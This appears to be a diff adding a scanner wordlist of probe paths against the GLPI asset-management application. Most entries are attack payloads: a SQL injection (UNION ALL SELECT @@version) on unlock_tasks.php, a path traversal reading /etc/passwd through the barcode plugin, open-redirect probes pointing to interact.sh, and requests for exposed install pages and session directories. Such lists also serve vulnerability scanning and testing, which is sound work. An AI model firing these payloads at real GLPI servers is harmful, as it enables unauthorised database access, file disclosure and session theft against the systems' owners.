@@ -1,0 +1,17 @@
+/glpi/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1
+/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1
+/glpi/plugins/barcode/front/send.php?file=../../../../../../../../etc/passwd
+/install/install.php
+
+/CHANGELOG.md
+/glpi/
+/status.php
+/glpi/status.php
+/glpi2/status.php
+/index.php?redirect=/\/interact.sh/
+/index.php?redirect=//interact.sh
+/ajax/telemetry.php
+/glpi/ajax/telemetry.php
+/glpi/files/
+/glpi/files/_sessions/
+/files/_sessions/
